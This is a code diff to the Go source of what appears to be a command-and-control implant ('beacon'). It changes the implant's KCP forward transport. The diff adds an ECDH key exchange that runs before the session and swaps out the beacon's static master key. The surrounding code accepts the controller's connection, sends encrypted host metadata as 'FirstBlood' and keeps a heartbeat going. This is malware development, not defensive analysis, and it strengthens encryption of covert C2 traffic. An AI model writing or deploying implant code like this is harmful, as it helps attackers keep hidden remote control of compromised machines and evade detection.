@@ -3,20 +3,20 @@
 package main
 
 import (
-	"sync"
+	"encoding/binary"
+	"fmt"
 	"implant/core/app"
-	"implant/core/debuglog"
 	"implant/core/communication"
+	"implant/core/debuglog"
 	"implant/core/encrypt"
 	"implant/core/reconnect"
 	"implant/core/utils"
-	"fmt"
 	"net"
+	"sync"
 	"time"
 
 	"github.com/xtaci/kcp-go/v5"
 )
-
 
 // NewTransport 构造 kcp_forward 传输（单二进制 build tag 入口）
 // init 注册到运行时传输表（多传输构建下按 scheme 选择；单传输构建下只有自己）
@@ -41,7 +41,7 @@ type KCPForwardClient struct {
 	reconnectMgr *reconnect.ReconnectManager
 	connected    bool
 	stopCh       chan struct{} // 心跳 goroutine 退出信号
-	sendMutex    sync.Mutex   // 串行化所有写路径（心跳/结果/FirstBlood），防帧交错
+	sendMutex    sync.Mutex    // 串行化所有写路径（心跳/结果/FirstBlood），防帧交错
 }
 
 func (s *KCPForwardClient) fail() {
@@ -49,6 +49,43 @@ func (s *KCPForwardClient) fail() {
 	if s.reconnectMgr != nil {
 		s.reconnectMgr.OnReconnectFailed()
 	}
+}
+
+// kxHandshake 会话前密钥交换（与反向 kcp 同协议）。
+// 服务端复用 HandleKCPConnectionForWithKeys，KX case 在共享循环里，无需改服务端。
+func (s *KCPForwardClient) kxHandshake() {
+	kx, err := encrypt.NewKeyExchange()
+	if err != nil {
+		return
+	}
+	if err := s.rawSend(utils.BytesCombine(utils.WriteInt(kxMsgType), []byte(kx.HeaderValue()))); err != nil {
+		return
+	}
+	total, err := communication.ReadFramedLength(s.Client)
+	if err != nil || total < 8 {
+		return
+	}
+	payload, err := communication.ReadFramedPayload(s.Client, total)
+	if err != nil || len(payload) < 4 {
+		return
+	}
+	if int(binary.BigEndian.Uint32(payload[:4])) != kxMsgType {
+		return
+	}
+	peerPub, err := encrypt.ParsePeerPublicKey(string(payload[4:]))
+	if err != nil {
+		return
+	}
+	salt, _ := app.GetListenerKeyConfig(listenerType)
+	masterKey, err := kx.DeriveMasterKey(peerPub, salt[:16])
+	if err != nil {
+		return
+	}
+	if err := encrypt.GlobalClientKeyManager.ReplaceMasterKey(masterKey); err != nil {
+		return
+	}
+	utils.MetaInfo = nil
+	debuglog.Printf("🔑 [KCP-FWD-KX] 会话前密钥交换完成，已替换静态主密钥\n")
 }
 
 // Connect 在 spec（listenAddr:port）上监听并 Accept 服务端连入，然后 FirstBlood + 会话密钥 + 心跳。
@@ -89,6 +126,10 @@ func (s *KCPForwardClient) Connect(spec string) error {
 	s.Client = sess
 	s.connected = true
 
+	// 会话前 ECDH 交换（forward 下 beacon 是 Accept 方，但协议角色不变：仍由 beacon
+	// 发 firstBlood）。服务端复用 HandleKCPConnectionForWithKeys，KX case 已在共享循环里。
+	s.kxHandshake()
+
 	// MetaInfo + FirstBlood
 	if len(utils.MetaInfo) == 0 {
 		utils.MetaInfo, _ = utils.EncryptedMetaInfo()
@@ -114,7 +155,7 @@ func (s *KCPForwardClient) Connect(spec string) error {
 		close(s.stopCh)
 	}
 	s.stopCh = make(chan struct{})
-stop := s.stopCh
+	stop := s.stopCh
 	go app.HeartbeatLoop(stop, s.keepAlive)
 
 	debuglog.Printf("✅ [KCP-FORWARD] 服务端连入: %s\n", sess.RemoteAddr())
@@ -187,7 +228,7 @@ func (s *KCPForwardClient) rawSend(msg []byte) error {
 }
 
 func (s *KCPForwardClient) keepAlive() {
-		s.rawSend(communication.HeartbeatMsg())
+	s.rawSend(communication.HeartbeatMsg())
 }
 
 func (s *KCPForwardClient) Close() error {
